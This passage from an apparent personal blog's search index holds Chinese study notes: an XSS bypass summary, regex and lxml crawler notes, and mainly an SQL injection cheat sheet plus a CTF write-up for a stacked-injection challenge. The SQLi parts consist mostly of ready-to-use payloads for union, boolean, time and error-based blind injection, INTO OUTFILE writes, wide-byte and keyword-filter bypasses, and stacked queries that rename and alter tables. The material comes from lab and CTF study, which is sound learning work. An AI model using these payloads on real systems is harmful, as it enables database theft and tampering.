进行了完全屏蔽,可以双写绕过，因为只过滤了一次</span><br><span class="line">7.给了一个链接，相当于一个标签注入，script被转义，双写大小写都不行，可以用HTML字符转换绕过，转成16进制或10进制</span><br><span class="line">8.需要http:&#x2F;&#x2F;,源码中要匹配</span><br><span class="line">9.user-agent、cookie、referer处都可能是注入点</span><br><span class="line">10.上传含有XSS代码的图片触发漏洞</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Xss总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli</title>
      <link href="/2020/01/13/sqli/"/>
      <url>/2020/01/13/sqli/</url>
      
        <content type="html"><![CDATA[<p>根据sqli-labs上的教学做了一个sql用法的总结</p><a id="more"></a><h4 id="1-union联合查询"><a href="#1-union联合查询" class="headerlink" title="1.union联合查询"></a>1.union联合查询</h4><p>union的作用是将两个sql语句进行联合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#</span></span><br><span class="line">此时的<span class="keyword">sql</span>语句为<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">--+ LIMIT 0,1 </span></span><br><span class="line">接着下一步就是爆数据表</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = '</span><span class="keyword">security</span><span class="string">'#</span></span><br><span class="line"><span class="string">通过这一步可以得到表名，接着来爆出表的列</span></span><br><span class="line"><span class="string">?id=-1'</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span><span class="comment">#</span></span><br><span class="line">最后就是爆数据了，根据上一步可以看到这个表中有什么列值，根据需要来爆</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">'union select 1,username,password from users where id = 2#</span></span><br></pre></td></tr></table></figure><p>根据注入时的提示，可以判断注入的形式，可能是?id=1’),?id=1”)。</p><h3 id="2-盲注-下面的都是能使用的payload展示"><a href="#2-盲注-下面的都是能使用的payload展示" class="headerlink" title="2.盲注:(下面的都是能使用的payload展示)"></a>2.盲注:(下面的都是能使用的payload展示)</h3><p>1’:基于布尔SQL盲注</p><p>2’:基于时间的SQL盲注</p><p>3’:基于报错的SQL盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">布尔注入</span><br><span class="line">利用left(database(),1)</span><br><span class="line">?id=1'and <span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">version</span>(),<span class="number">1</span>)=<span class="number">5</span><span class="comment">#可以查看版本号的首位字</span></span><br><span class="line">利用<span class="keyword">substr</span>(a,b,c),从第b位开始取出a中长度为c的子串</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ascii(substr(select table_name from information_schema.tables where table_schema=database()limit0,1),1,1)=113#</span></span><br><span class="line"><span class="string">利用regexp正则匹配</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">and</span> column_name regexp <span class="string">'^userame'</span><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">利用<span class="keyword">ord</span>()和<span class="keyword">mid</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and ord(mid(select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1)=68#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">报错注入</span><br><span class="line">?id=1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br><span class="line">利用<span class="built_in">bigint</span>溢出</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select(!(select * from (select user())x)-~0),2,3#</span></span><br><span class="line"><span class="string">xpath函数报错注入</span></span><br><span class="line"><span class="string">?id=1;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</span></span><br><span class="line"><span class="string">updatexml</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line">利用数据重复性</span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'union select 1,2,3 from (select name_const(version(),1),name_const(version(),1))x#</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">延时注入</span><br><span class="line">利用sleep()函数进行注入</span><br><span class="line">?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">#(若有错误时有5秒时间延时)</span></span><br><span class="line">利用benchmark()进行延时注入</span><br><span class="line">?id=1' union <span class="keyword">select</span>(<span class="keyword">if</span>(<span class="keyword">substring</span>(<span class="keyword">current</span>,<span class="number">1</span>,<span class="number">1</span>)=<span class="built_in">char</span>(<span class="number">115</span>),<span class="keyword">benchmark</span>(<span class="number">50000000</span>,<span class="keyword">encode</span>(<span class="string">'MSG'</span>,<span class="keyword">by</span> <span class="number">5</span> <span class="keyword">seconds</span>)),<span class="literal">null</span>)),<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">as</span> <span class="keyword">current</span>)<span class="keyword">as</span> tb1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h4 id="3-导入导出"><a href="#3-导入导出" class="headerlink" title="3.导入导出"></a>3.导入导出</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"c:\\wamp\\www\\sqllib\\Less-7\\uuu.txt"</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</p><p><strong>stripslashes()</strong> 函数删除由 addslashes() 函数添加的反斜杠</p><p><strong>mysql_real_escape_string()</strong> 函数转义 SQL 语句中使用的字符串中的特殊字符</p><p>如何绕过or和and过滤：</p><p>1.大小写变形 Or,OR,oR</p><p>2.编码，hex，urlencode</p><p>3.添加注释/<em>or</em>/</p><p>4.利用符号 and=&amp;&amp; or=||</p><p>%09 TAB键（水平） </p><p>%0a 新建一行 </p><p>%0c 新的一页 </p><p>%0d return功能 </p><p>%0b TAB键（垂直） </p><p>%a0 空格 </p><h4 id="4-宽字节注入"><a href="#4-宽字节注入" class="headerlink" title="4.宽字节注入"></a>4.宽字节注入</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原理：mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。我们在过滤 ' 的时候，往往利用的思路是将 ' 转换为 \' </span><br><span class="line"></span><br><span class="line"> 1.%df吃掉 \ 具体的原因是urlencode('\) = %5c%27，我们在%5c%27前面添加%df，形成%df%5c%27，而上面提到的mysql在GBK编码方式的时候会将两个字节当做一个汉字，此事%df%5c就是一个汉字，%27则作为一个单独的符号在外面，同时也就达到了我们的目的。</span><br><span class="line"> 2.将 \' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。这也是bypass的一种方法。</span><br></pre></td></tr></table></figure><h4 id="5-堆叠注入"><a href="#5-堆叠注入" class="headerlink" title="5.堆叠注入"></a>5.堆叠注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);过滤了括号内的东西</span></span><br><span class="line"><span class="string">?a=1#返回正常</span></span><br><span class="line"><span class="string">堆叠查询 id=1';show databases;'爆出数据库内容</span></span><br><span class="line"><span class="string">id=1';show tables;'爆出所有表名</span></span><br><span class="line"><span class="string">/?inject=1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串</span></span><br></pre></td></tr></table></figure><h4 id="6-二次注入"><a href="#6-二次注入" class="headerlink" title="6.二次注入"></a>6.二次注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.php?id=%2527,第一次解码的结果为id=1%27,%25解码为%,如果使用了urldecode或者rawurldecode来解码id参数，结果为id=1'单引号成功出现引发注入.</span><br></pre></td></tr></table></figure><p>用hex先将字符转换成16进制，然后用CONV函数将16进制转化为10进制</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫</title>
      <link href="/2020/01/13/%E7%88%AC%E8%99%AB/"/>
      <url>/2020/01/13/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h3 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h3><p>import re<a id="more"></a></p><h4 id="匹配任意字符除了换行符"><a href="#匹配任意字符除了换行符" class="headerlink" title=". 匹配任意字符除了换行符"></a>. 匹配任意字符除了换行符</h4><p>[…] 匹配字符集<br>\d/\D 匹配数字/非数字<br>\s/\S 匹配空白/非空白字符<br>\w/\W匹配单词字符[a-zA-Z0-9]/非单词字符</p><p>*匹配前一个字符0次或者无限次</p><p>+匹配前一个字符1次或者无限次<br>？ 匹配前一个字符0次或者1次<br>{m}/{m,n}匹配前一个字符m次或者n次<br>*? /+? /??匹配模式变为非贪婪<br>^匹配字符串开头<br>$匹配字符串结尾<br>\A/\Z指定的字符串匹配必须出现在开头/结尾</p><h4 id="匹配方式"><a href="#匹配方式" class="headerlink" title="匹配方式:"></a>匹配方式:</h4><p>match方法从开头开始匹配内容，失败返回None<br>search扫描整个匹配内容返回第一个成功的匹配<br>compile编译一个正则表达式<br>findall找到所有匹配的子串，并返回一个列表，未找到则返回空列表<br>sub(正则表达式，替换内容，替换目标)<br>spilt(res，a)分割</p><h3 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h3><h4 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h4><p>1.安装 pip install lxml<br>2.语法<br>(1)选取节点：<br>nodename  选取此节点的所有子节点<br>/         从根节点选取<br>//          从匹配选择的当前节点选择文档中的节点，不考虑位置‘<br>.          选取当前节点<br>..          选取当前节点的父节点<br>@          选取属性<br>(2)谓语<br>//title[@lang]    选取所有拥有名为 lang 的属性的 title 元素<br>//title[@lang=’eng’]    选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性<br>(3)选取未知节点</p><p>‘*’匹配任何元素节点<br>@”星号”    匹配任何属性节点<br>node()    匹配任何类型的节点</p><p>lxml主要是为了用来解析html，作用和正则匹配差不多，但是使用起来会更加方便</p>]]></content>
      
      
      
        <tags>
            
            <tag> climb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql1</title>
      <link href="/2020/01/12/sql1/"/>
      <url>/2020/01/12/sql1/</url>
      
        <content type="html"><![CDATA[<p>强网杯2019 web随便注</p><p>return preg_match<a id="more"></a>(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常</p><p>考虑用堆叠注入</p><p>堆叠查询 <code>id=1&#39;;show databases;</code>‘爆出数据库内容<br><code>id=1&#39;;show tables;&#39;</code>爆出所有表名</p><p>1.因为alert,rename没有被过滤，可以改变表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`/?inject=1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);*#*</span><br><span class="line">拆开来：</span><br><span class="line">1';</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>最后直接通过1’or’1’=’1可以爆出flag</p><p>2.预编译：16进制绕过</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1';</span><br><span class="line"><span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;</span><br><span class="line"><span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 堆叠注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
